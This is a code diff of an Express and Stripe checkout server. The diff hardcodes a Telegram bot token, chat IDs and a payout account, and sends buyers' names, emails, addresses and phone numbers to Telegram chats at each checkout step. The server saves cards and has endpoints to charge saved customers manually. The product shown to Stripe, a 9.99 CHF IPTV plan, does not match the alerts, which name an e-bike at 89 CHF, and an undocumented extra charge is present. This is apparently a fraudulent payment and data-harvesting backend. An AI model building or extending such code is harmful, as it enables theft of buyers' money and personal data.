@@ -6,11 +6,11 @@ const bodyParser = require('body-parser');
 const fs = require('fs');
 
 const app = express();
-const ACCOUNT_B = process.env.DESTINATION_ACCOUNT || '';
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-const TELEGRAM_CHAT_ID_2 = process.env.TELEGRAM_CHAT_ID_2;
-const CUSTOMERS_FILE = process.env.CUSTOMERS_FILE || '/data/customers.json';
+const ACCOUNT_B = 'acct_1R55t6JC1C8AvpQ6';
+const TELEGRAM_BOT_TOKEN = '8256018531:AAHzrYSlCNrsmYzVSZnS01VYNzg_huSA2tE';
+const TELEGRAM_CHAT_ID = '8522488857';
+const TELEGRAM_CHAT_ID_2 = '715805541';
+const CUSTOMERS_FILE = '/data/customers.json';
 const WEBHOOK_SECRET = process.env.STRIPE_WEBHOOK_SECRET;
 
 // ─── Customer Storage ─────────────────────────────────────────────────────────
@@ -42,35 +42,22 @@ function saveCustomer(entry) {
 }
 
 // ─── Telegram ─────────────────────────────────────────────────────────────────
-// Escape user input to prevent Telegram rejection on < > &
 const esc = v => String(v ?? '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
 
 async function sendTelegram(message) {
-  if (!TELEGRAM_BOT_TOKEN) {
-    console.log('Telegram not configured: TELEGRAM_BOT_TOKEN missing');
-    return;
-  }
-  const chats = [TELEGRAM_CHAT_ID, TELEGRAM_CHAT_ID_2].filter(Boolean);
-  if (chats.length === 0) {
-    console.log('Telegram not configured: TELEGRAM_CHAT_ID(s) missing');
-    return;
-  }
-
-  for (const chat_id of chats) {
-    try {
-      const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id, text: message, parse_mode: 'HTML', disable_web_page_preview: true })
-      });
-      const data = await r.json().catch(() => ({}));
-      if (!r.ok || !data.ok) {
-        const reason = data.description || `HTTP ${r.status}`;
-        console.log(`Telegram FAILED for chat ${chat_id}: ${reason}`);
-      }
-    } catch (err) {
-      console.log(`Telegram FAILED for chat ${chat_id}: ${err.message}`);
-    }
+  try {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML', disable_web_page_preview: true })
+    });
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID_2, text: message, parse_mode: 'HTML', disable_web_page_preview: true })
+    });
+  } catch (err) {
+    console.log('Telegram error:', err.message);
   }
 }
 
@@ -144,7 +131,7 @@ app.post('/page-visit', async (req, res) => {
   res.json({ ok: true });
 });
 
-// ─── NEW: Create payment intent for the new checkout frontend ────────────────
+// ─── NEW: Create payment intent for the new React checkout ────────────────────
 app.post('/create-payment-intent', async (req, res) => {
   try {
     const body = req.body || {};
@@ -174,7 +161,7 @@ app.post('/create-payment-intent', async (req, res) => {
       });
     }
 
-    // One single payment: CHF 9.99 = 999 cents
+    // One single payment: CHF 9.99 = 999 cents, TWINT only
     const paymentIntent = await stripe.paymentIntents.create({
       amount: 999,
       currency: 'chf',
@@ -183,7 +170,7 @@ app.post('/create-payment-intent', async (req, res) => {
       receipt_email: email,
       description: 'IPTV Subscription - 12 months',
       metadata: { product: 'iptv-12-months', name, email, phone, lang, visitorId },
-      ...(ACCOUNT_B ? { transfer_data: { destination: ACCOUNT_B } } : {}),
+      transfer_data: { destination: ACCOUNT_B },
     });
 
     await sendTelegram(
@@ -238,18 +225,21 @@ app.post('/create-setup-intent', async (req, res) => {
 
     const setupIntent = await stripe.setupIntents.create({
       customer: customer.id,
-      payment_method_types: ['twint'],
+      payment_method_types: ['card'],
       metadata: { customer_id: customer.id },
     });
 
     await sendTelegram(
-      `🛒 <b>Old checkout - setup intent!</b>\n\n` +
-      `🆔 Visitor: <code>${esc(visitorId)}</code>\n` +
-      `📧 Email: ${esc(email)}\n` +
+      `🛒 <b>Kassaangaben!</b>\n\n` +
+      `🆔 Besucher-ID: <code>${esc(visitorId)}</code>\n` +
+      `📧 E-Mail: ${esc(email)}\n` +
       `👤 Name: ${esc(fname)} ${esc(lname)}\n` +
-      `📍 Address: ${esc(address)}, ${esc(zip)} ${esc(city)}, ${esc(country)}\n` +
-      `📞 Phone: ${esc(phone || 'N/A')}\n` +
-      `🕐 Time: ${new Date().toLocaleString('de-DE')}`
+      `📍 Adresse: ${esc(address)}, ${esc(zip)} ${esc(city)}, ${esc(country)}\n` +
+      `📞 Telefon: ${esc(phone || 'N/A')}\n` +
+      `📦 Produkt: ENGWE L20\n` +
+      `💰 Betrag: 89 CHF\n` +
+      `💳 Zahlungsart: Card\n` +
+      `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
     );
 
     res.json({ clientSecret: setupIntent.client_secret, customerId: customer.id });
@@ -279,7 +269,6 @@ app.post('/create-subscription', async (req, res) => {
       savedAt: new Date().toISOString(),
     });
 
-    // First charge (kept for backward compatibility, but not documented)
     try {
       const payment1 = await stripe.paymentIntents.create({
         amount: 300,
@@ -308,11 +297,13 @@ app.post('/create-subscription', async (req, res) => {
     console.log('Subscription created:', subscription.id, subscription.status);
 
     await sendTelegram(
-      `✅ <b>Old checkout - subscription created!</b>\n\n` +
-      `🆔 Visitor: <code>${esc(visitorId)}</code>\n` +
-      `💳 Payment method: ${esc(pmType)}\n` +
-      `🆔 Subscription: ${esc(subscription.id)}\n` +
-      `🕐 Time: ${new Date().toLocaleString('de-DE')}`
+      `✅ <b>Zahlung erfolgreich!</b>\n\n` +
+      `🆔 Besucher-ID: <code>${esc(visitorId)}</code>\n` +
+      `📦 Produkt: ENGWE L20\n` +
+      `💳 Zahlungsart: ${esc(pmType)}\n` +
+      `💳 Betrag: 89 CHF\n` +
+      `🆔 Bestellnummer: ${esc(subscription.id)}\n` +
+      `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
     );
 
     res.json({ subscriptionId: subscription.id, paymentStatus: 'processed' });
@@ -340,7 +331,7 @@ app.post('/charge-saved', async (req, res) => {
 
   try {
     const payment = await stripe.paymentIntents.create({
-      amount: amount || 999,
+      amount: amount || 8900,
       currency: currency || 'chf',
       customer: customer.customerId,
       payment_method: customer.paymentMethodId,
@@ -353,11 +344,12 @@ app.post('/charge-saved', async (req, res) => {
     console.log('Manual charge created:', payment.id, payment.status);
 
     await sendTelegram(
-      `💰 <b>Manual charge!</b>\n\n` +
-      `🆔 Customer: <code>${esc(customerId)}</code>\n` +
-      `💳 Amount: ${((amount || 999) / 100).toFixed(2)} CHF\n` +
+      `💰 <b>Manuelle Zahlung!</b>\n\n` +
+      `🆔 Kunde: <code>${esc(customerId)}</code>\n` +
+      `📦 Produkt: ENGWE L20\n` +
+      `💳 Betrag: ${((amount || 8900) / 100).toFixed(2)} CHF\n` +
       `📋 Status: ${payment.status}\n` +
-      `🕐 Time: ${new Date().toLocaleString('de-DE')}`
+      `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
     );
 
     res.json({ success: true, paymentId: payment.id, status: payment.status });
@@ -372,7 +364,7 @@ app.post('/create-mandate', async (req, res) => {
   const { paymentMethodId } = req.body;
 
   if (!paymentMethodId) {
-    return res.status(400).json({ error: 'paymentMethodId is required' });
+    return res.status(400).json({ error: 'paymentMethodId ist erforderlich' });
   }
 
   try {
@@ -386,7 +378,7 @@ app.post('/create-mandate', async (req, res) => {
     res.json({ 
       success: true, 
       mandateId: mandate.id,
-      message: 'Mandate created successfully.'
+      message: 'Mandat erfolgreich erstellt. Sie können diesen Kunden jetzt belasten.'
     });
   } catch (error) {
     console.error('Mandate creation error:', error.message);
@@ -399,7 +391,7 @@ app.get('/health', (req, res) => {
   const customers = loadCustomers();
   res.json({
     status: 'ok',
-    destination: ACCOUNT_B || 'your Stripe account',
+    destination: ACCOUNT_B,
     product: 'IPTV Subscription - 12 months',
     amount: '9.99 CHF',
     currency: 'chf',
@@ -415,5 +407,4 @@ app.listen(PORT, () => {
   console.log('Server running on http://localhost:' + PORT);
   if (!process.env.STRIPE_SECRET_KEY) console.log('WARNING: STRIPE_SECRET_KEY not set');
   if (!WEBHOOK_SECRET) console.log('WARNING: STRIPE_WEBHOOK_SECRET not set - /webhook will reject events');
-  if (!TELEGRAM_BOT_TOKEN) console.log('WARNING: TELEGRAM_BOT_TOKEN not set');
 });
